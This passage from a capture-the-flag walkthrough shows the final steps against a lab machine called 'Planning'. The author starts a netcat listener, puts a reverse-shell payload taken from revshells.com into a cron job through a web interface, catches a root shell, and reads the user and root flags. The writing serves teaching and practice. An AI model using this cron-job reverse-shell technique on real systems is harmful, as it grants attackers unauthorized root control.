<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/createcronjob.png" title="Create Cron Job" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% capture start9001listener %}
└──╼ [★]$ rlwrap nc -nlvp 9001
listening on [any] 9001 ...
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=start9001listener %}

<br />
Check the revshells to get a payload.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/revshells.png" title="Revshells" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.revshells.com/">https://www.revshells.com/</a>

<br />
Update the cronjob command to use the command from the revshells.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/updatecronjob.png" title="Update The Cronjob" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click Run Now to force our cronjob to run.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/planning/runnow.png" title="Run Now" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on OK on the confirm job, check the listener, and catch the shell.

{% capture checkshell %}
└──╼ [★]$ rlwrap nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.11.68] 53950
root@planning:/#
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=checkshell %}

<br />
Get the user flag.

{% capture userflag %}
root@planning:/# cat /home/enzo/user.txt
cat /home/enzo/user.txt
<redacted>
root@planning:/# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:c8:08 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.68/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:c808/64 scope global dynamic mngtmpaddr 
       valid_lft 86398sec preferred_lft 14398sec
    inet6 fe80::250:56ff:fe95:c808/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5d:fe:1c:77 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5dff:fefe:1c77/64 scope link 
       valid_lft forever preferred_lft forever
5: vethd8e9952@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether fe:0c:e2:5b:cf:32 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fc0c:e2ff:fe5b:cf32/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=userflag %}

<br />
Get the root flag.

{% capture rootflag %}
root@planning:/# cat /root/root.txt
cat /root/root.txt
<redacted>
root@planning:/# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host noprefixroute 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:95:c8:08 brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.68/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:fe95:c808/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:fe95:c808/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:5d:fe:1c:77 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:5dff:fefe:1c77/64 scope link 
       valid_lft forever preferred_lft forever
5: vethd8e9952@if4: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master docker0 state UP group default 
    link/ether fe:0c:e2:5b:cf:32 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::fc0c:e2ff:fe5b:cf32/64 scope link 
       valid_lft forever preferred_lft forever
{% endcapture %}
{% include terminal.html language='bash' title='bash' content=rootflag %}

<br />
Great!  It looks like we cracked the Code.  See you in the next box!s

<br />
<h2>Trophy</h2>
<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/planning/trophy.png" title="Trophy" class="img-fluid rounded z-depth-1" %}
    </div>
</div>